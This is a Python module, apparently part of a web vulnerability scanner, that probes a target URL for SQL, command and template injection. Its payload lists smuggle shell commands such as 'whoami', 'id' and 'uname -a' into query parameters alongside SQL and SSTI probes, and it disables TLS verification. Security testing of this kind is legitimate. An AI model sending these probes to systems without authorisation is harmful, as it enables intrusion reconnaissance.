"""
Injection Scanner - SQL Injection, Command Injection, NoSQL Injection, SSTI
"""
import requests
import urllib.parse
import time

def scan(target):
    findings = []

    if not target.startswith('http'):
        target = f'https://{target}'

    print(f"[PHASE 15] Injection Scanner: Scanning {target}")

    # SQL Injection Tests
    sql_payloads = [
        "'", "''", "' OR '1'='1", "1' ORDER BY 100--",
        "1' AND 1=1--", "1' AND 1=2--",
        "1 UNION SELECT null--", "1 UNION SELECT null,null--",
    ]

    sql_errors = ['sql syntax', 'mysql_error', 'ORA-', 'PostgreSQL', 'sqlite_',
                  'You have an error in your SQL syntax', 'Unclosed quotation mark']

    params = ['id', 'page', 'user', 'product', 'cat', 'q', 'search']

    for param in params[:5]:
        for payload in sql_payloads[:5]:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                body_lower = resp.text.lower()
                for err in sql_errors:
                    if err.lower() in body_lower:
                        findings.append({
                            'id': 'SQLI-001',
                            'severity': 'critical',
                            'type': 'sql_injection',
                            'title': f'SQL Injection in "{param}"',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'SQL Error: {err}',
                            'remediation': 'Prepared Statements verwenden'
                        })
                        return findings
            except:
                continue

    # Time-based SQL Injection
    time_payloads = [
        ("1' AND SLEEP(5) --", 5),
        ("1'; SELECT pg_sleep(5) --", 5),
    ]
    for param in params[:3]:
        for payload, delay in time_payloads:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                requests.get(url, timeout=delay+3, verify=False)
                elapsed = time.time() - start
                if elapsed >= delay * 0.8:
                    findings.append({
                        'id': 'SQLI-002',
                        'severity': 'critical',
                        'type': 'sql_injection_blind',
                        'title': f'Blind SQL Injection (Time-based) in "{param}"',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response: {elapsed:.1f}s (Payload: {delay}s)',
                        'remediation': 'Parameterized Queries, Timeouts setzen'
                    })
                    return findings
            except:
                continue

    # Command Injection
    cmd_payloads = ['; whoami', '| whoami', '$(whoami)', '; id', '| id', '; uname -a']
    cmd_indicators = ['root:', 'daemon:', 'administrator', 'Linux ', 'Darwin ']

    for param in params[:3]:
        for payload in cmd_payloads[:4]:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                for ind in cmd_indicators:
                    if ind.lower() in resp.text.lower():
                        findings.append({
                            'id': 'CMDI-001',
                            'severity': 'critical',
                            'type': 'command_injection',
                            'title': f'Command Injection in "{param}"',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Command Output: {ind}',
                            'remediation': 'OS-Commands vermeiden, Input validieren'
                        })
                        return findings
            except:
                continue

    # SSTI
    ssti_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>']
    for param in params[:3]:
        for payload in ssti_payloads:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                if '49' in resp.text or '7777777' in resp.text:
                    findings.append({
                        'id': 'SSTI-001',
                        'severity': 'critical',
                        'type': 'ssti',
                        'title': f'Server-Side Template Injection in "{param}"',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Template Evaluation: {payload} -> 49',
                        'remediation': 'Templates sandboxen, User-Input nicht rendern'
                    })
                    return findings
            except:
                continue

    if not findings:
        findings.append({
            'id': 'INJ-OK',
            'severity': 'info',
            'type': 'injection_scan',
            'title': 'Keine Injection-Schwachstellen gefunden',
            'url': target,
            'evidence': 'SQLi, CMDi, SSTI Payloads getestet',
            'remediation': 'Weiterhin Input validieren'
        })

    return findings
